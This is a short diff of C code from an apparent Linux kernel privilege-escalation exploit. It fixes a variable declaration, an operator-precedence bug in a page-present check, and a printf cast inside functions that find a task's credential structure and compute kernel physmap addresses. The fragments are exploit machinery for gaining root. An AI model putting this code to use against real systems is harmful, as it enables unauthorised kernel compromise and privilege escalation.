@@ -59,10 +59,10 @@ static int read_kernel(void *target,void *buffer,unsigned size){
 
 
 static void *find_struct_cred_addr(void *task_struct_addr){
-	int ret,i;
+	int ret;
 	struct task_struct *task;
 	void *cred_addr = NULL;
-	unsigned int size = 0x100*sizeof(size_t);
+	unsigned int size = 0x100*sizeof(size_t),i;
 	int *taskbuf = (int *)malloc(size);
 	if(!taskbuf){
 		printf("[-]malloc task space failed\n");
@@ -255,12 +255,12 @@ void* compute_physmap(void *usr_addr){
 		printf("[-] read pagemap failed\n");
 		return NULL;
 	}
-	if(pentry & PRESENT_MASK == 0){
+	if((pentry & PRESENT_MASK) == 0){
 		printf("[-]%p is not present in physical memory\n",usr_addr);
 	}else{
 		PFN = pentry & PFN_MASK;
 		kaddr = (void *)((size_t)(PFN-PFN_MIN)*PAGE_SIZE+PHYS_OFFSET);
-		printf("[+]PFN[%p]:%llu,target_kaddr:%p\n",usr_addr,PFN,kaddr);
+		printf("[+]PFN[%p]:%llu,target_kaddr:%p\n",usr_addr,(long long unsigned int)PFN,kaddr);
 	}
 	return kaddr;
 }
